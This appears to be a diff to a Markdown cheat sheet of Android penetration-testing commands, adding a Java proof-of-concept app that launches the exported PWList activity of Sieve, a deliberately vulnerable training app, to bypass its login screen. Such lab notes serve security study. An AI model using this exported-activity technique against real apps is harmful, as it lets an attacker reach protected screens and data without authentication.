@@ -29,7 +29,35 @@
   - input text to device: `input text <your_text>`
   - start an activity: `am start-activity -n <package_name>/<activity_name>`
     - Example: `am start-activity -n com.mwr.example.sieve/.FileSelectorActivity`
-    - **NOTE**: `<package_name>` & `<activity_name>` can be found inside the decompiled **AndroidManifest.xml** file obtained using **apktool**. Also this is possible only if activity is exported(explicit) or if an intent(implicit) is encapsulated
+    - **NOTE**:
+      - `<package_name>` & `<activity_name>` can be found inside the decompiled **AndroidManifest.xml** file obtained using **apktool**.
+      - This is possible only if activity is exported(explicit) or if an intent(implicit) is encapsulated
+      - A formal way to trigger this intent is to create an app and start the activity as follows:
+        > ```java
+        > // "empty activity" template selected in android studio
+        > package com.hacking.sieveloginbypass;
+        > import androidx.appcompat.app.AppCompatActivity;
+        > 
+        > import android.content.ComponentName;
+        > import android.content.Intent;
+        > import android.os.Bundle;
+        > 
+        > public class MainActivity extends AppCompatActivity {
+        > 
+        >  @Override
+        >  protected void onCreate(Bundle savedInstanceState) {
+        >    super.onCreate(savedInstanceState);
+        >    setContentView(R.layout.activity_main);
+        > 
+        >    // code - to start the following Activity
+        >    // com.mwr.example.sieve / .PWList
+        >    Intent intent = new Intent();
+        >    //intent.setComponent(new ComponentName("<package_name>","<package_name>.<class_name who's exported/intent encapsulated>"));
+        >    intent.setComponent(new ComponentName("com.mwr.example.sieve","com.mwr.example.sieve.PWList"));
+        >    startActivity(intent);
+        >  }
+        > }
+        > ```
 
 ### APKTOOL COMMANDS:
   - decompile apk using apktool: `apktool d <filename.apk>`
